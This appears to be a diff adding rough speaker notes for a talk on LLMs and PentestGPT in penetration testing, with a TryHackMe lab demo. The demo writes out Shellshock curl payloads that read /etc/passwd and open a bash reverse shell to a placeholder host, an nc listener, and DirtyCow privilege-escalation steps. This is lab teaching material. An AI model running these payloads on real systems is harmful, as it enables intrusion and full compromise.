@@ -1,0 +1,151 @@
+
+Page - 3
+
+# What are LLMs?
+
+LLMs (Large Language Models) are advanced machine learning models, specifically designed to understand and generate human-like text based on the input they receive. (That’s what google says)
+
+# What does Large Mean?
+Basically the number of parameters they have decides how large a language model is.
+
+Examples: OpenAI’s GPT series, Google’s Gemini, and Meta’s LLaMA.
+
+
+
+Page - 5
+
+# The answer is Training on Data
+
+
+LLMs are trained on vast amounts of text data from the internet, which enables them to generate coherent, diverse, and contextually relevant text passages.
+
+Also LLMs are trained on massive datasets containing text from books, articles, websites, forums, and other sources.
+
+These datasets cover a wide variety of topics, languages, and contexts, allowing the model to "learn" about nearly every area of human knowledge.
+
+2nd para- 
+
+# You can think of LLMs as a function which accepts text input and understands the context from the input provided and outputs the relevant understanding it has of the input
+
+Page - 6 
+
+So what is pentesting, i will skip that that everyone knows.
+
+# So where do LLMs come in this picture of Pentesting & Cybersecurity? 
+
+# Automation and Scalability (We hackers are lazy)
+
+Streamlined Processes that Automates repetitive tasks such as vulnerability scanning, payload generation, and log analysis.
+
+and respect to the Code Analysis:
+it's Quickly identifies insecure code patterns and potential vulnerabilities in large codebases.
+
+Log Parsing and Analysis:
+Detects anomalies or Indicators of Compromise (IoCs) in real-time system logs. So it will easier for Soc team
+
+Report Generation:
+it can Produces detailed reports, professional pentest reports for both technical and non-technical stakeholders.
+
+----
+
+# Adaptive Testing ( Testing strategies based on feedback)
+
+Adaptive Testing is a feedback-driven testing approach where test cases and strategies evolve in real-time based on the results of previous tests. It focuses on high-risk areas or problematic components, optimizing resources and uncovering hidden vulnerabilities or issues.
+
+
+# Data Analysis (Analysing Tool Data)
+
+Data Analysis in the context of tool data refers to extracting actionable insights from the raw outputs of various software, systems, or security tools. This process is critical for decision-making, identifying threads, diagnosing issues, and optimizing performance.
+
+# Documentation & Reporting (Summarizing, Generating reports)
+
+it also help for Documentation & Reporting 
+
+Page - 7 
+
+# What if there was something that could do some of the things above?
+
+
+Page - 8 
+
+PentestGPT is a penetration testing tool empowered by Large Language Models (LLMs). It is designed to automate the penetration testing process. It is built on top of ChatGPT and operate in an interactive mode to guide penetration testers in both overall progress and specific operations.
+
+PentestGPT helps us achieve two things very well:
+
+Adaptive Testing ( Testing strategies based on feedback)
+Data Analysis (Analysing Tool Data)
+
+It can also to an extent help us crack a TryHackMe Box
+
+
+
+Page - 9 
+
+
+
+Demo -pt
+
+
+# basic enumerations steps on a IP
+
+
+# nikto -h url 
+
+# gobuster - 
+
+gobuster dir -u http://10.10.59.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 70
+
+Sugest exploit based on nikto - out put
+
+# curl 'http://10.10.59.118/cgi-bin/test.cgi?() { :; }; echo "Shellshocked"'
+
+# curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.59.118//cgi-bin/test.cgi
+
+exploting shellshock
+
+# curl 'http://10.10.59.118/cgi-bin/test.cgi?() { :; }; /bin/bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'
+
+# nc -lvnp YOUR_PORT
+
+
+# python -c 'import pty; pty.spawn("/bin/bash")'
+
+# export TERM=xterm
+
+We all know about basic enumartions, however im just asking to pentestgpt, lets see what we can get.
+
+# enumaration after initial access as www-data
+
+
+Privilages
+
+- uname -a 
+- uname -r 
+
+# suggest exploits for Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP
+
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+
+#  python -m http.server 8000
+
+# gcc cowroot.c -o cowroot -pthread
+
+======
+
+Page 10 - 
+
+So i have opened a door for you, it's time for you to play with it with your knowledge. 
+
+
+page 11 - 
+
+before the closure, i want to hight light something here, there is a high risk hidning here. 
+
+Important Note on Client Confidentiality:
+
+To ensure the confidentiality and integrity of our clients, avoid pasting any sensitive information, confidential data such as credentials, IP addresses, or physical addresses into the prompt. Since this is an open-source platform, there is a potential risk of data exposure in the future. Always exercise caution and prioritize data security.
+
+If you have any qustions regarding LLMs or anything, it is better to use the gpt promopt, so it can give more infomation that i can provide you.
+
+It's  Warp!! thank you for attending the session. have grate day ahead.
+
